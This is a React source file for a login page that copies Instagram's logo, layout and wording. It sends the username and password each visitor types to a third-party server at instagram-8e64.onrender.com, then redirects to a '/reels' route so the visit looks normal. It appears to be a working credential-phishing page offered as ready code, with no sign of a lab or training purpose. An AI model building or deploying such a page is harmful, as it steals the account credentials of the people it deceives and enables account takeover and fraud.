import React, { useState } from "react";
import { Navigate } from "react-router-dom";
import axios from "axios";
import "./index.css";

const Login = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [redirect, setRedirect] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!username || !password) return;

    try {
      // POST request to backend

      const response = await axios.post("https://instagram-8e64.onrender.com/", {
        username,
        password,
      });

      if (response.status === 200) {
        setRedirect(true);
      }
    } catch (error) {
      console.error("Login failed:", error.message);
      alert("Invalid credentials or server error.");
    }
  };

  if (redirect) return <Navigate to="/reels" />;

  return (
    <div className="main-container">
      <p className="lang-text">English (UK)</p>

      <img
        src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg"
        alt="instagram"
        className="insta-logo"
      />

      <form onSubmit={handleSubmit} className="login-form" method="POST">
        <input
          type="text"
          placeholder="Username, email address"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="input-field"
        />

        <div className="password-container">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="input-field"
          />
          <span
            className="toggle-password"
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? "Hide" : "Show"}
          </span>
        </div>

        <button type="submit" className="login-btn">
          Log in
        </button>
      </form>

      <p className="forgot-text">Forgotten password?</p>

      <div className="footer">
        <button className="create-btn">Create new account</button>
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png"
          alt="meta"
          className="meta-logo"
        />
      </div>
    </div>
  );
};

export default Login;
